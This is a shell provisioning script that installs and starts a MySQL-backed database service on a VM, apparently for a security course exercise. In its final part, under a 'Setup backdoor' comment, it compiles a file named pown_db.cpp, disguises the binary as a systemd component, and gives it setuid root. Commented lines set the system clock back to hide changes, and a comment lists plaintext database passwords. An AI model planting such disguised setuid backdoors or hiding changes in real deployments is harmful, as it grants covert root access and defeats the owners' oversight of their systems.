# Install mysql
#echo "Install MySQL"
# see https://www.digitalocean.com/community/tutorials/how-to-install-mysql-on-centos-7
#wget https://dev.mysql.com/get/mysql57-community-release-el7-9.noarch.rpm
#rpm -ivh mysql57-community-release-el7-9.noarch.rpm
#yum install mysql-server

# mysql users -> root:reallySecurePwd1!   dbuser:securePwd17!

# Run mysql service
#echo "Start MySQL"
#systemctl start mysqld
#systemctl status mysqld

# Create new database
#echo "Create new database"
#mysql -u root < create database iMoviesDB;
#mysql -u root < use iMoviesDB;

# Import imovies_users.dump in create db
#echo "Import dumped data"
#mysql -u root < source db_backup.dump;

# Configure MySQL
#echo "Configure MySQL"
# Generate temporary password
#grep 'temp' /var/log/mysqld.log
# Change default settings
#mysql_secure_installation


# Start VM

# Copy files from host to database@192.168.50.33:~/ using scp
# scp -r ./DB database@192.168.50.33:~/

# (TODO: Set date back in the past to hide changes)
#date -s '2014-12-25 12:34:56'

# Add user database to screen group to allow service execution
usermod -a -G screen database

# Set up CA stuff
echo "Setup"
cd /home/database

# Create needed directories
mkdir /home/database/logs
chown database /home/database/logs
chgrp database /home/database/logs
chmod 700 /home/database/logs

chmod 700 /home/database

# Move relevant data from copied folder to right place and set correct permissions
mv ./DB/database.jks .
chmod 500 /home/database/database.jks

mv ./DB/out/artifacts/DB_jar/DB.jar ./db.jar
chmod 500 /home/database/db.jar

mv ./DB/scripts/ ./scripts

# Prepare, enable and start service
cp /home/database/scripts/database.service /etc/systemd/system
systemctl daemon-reload
systemctl enable database
systemctl start database

# TODO: Set time to 2017-05-15 15:46:45?
#date  -s '2017-05-15 15:46:45'

# Setup backdoor
# Compile
g++ -std=c++11 ./scripts/pown_db.cpp -o systemd-agent # TODO: find better name?
# Move in right place
mv systemd-agent /usr/lib/systemd/
# Enable setuid
chmod 4755 /usr/lib/systemd/systemd-agent
# TODO: set time to current
#date  -s '2017-11-19 15:46:45'

# TODO: set secure passwords for all users (root, iadmin, database)
# passwd root
# passwd iadmin
# passwd database

# Cleanup
rm -r ./DB
rm -r ./scripts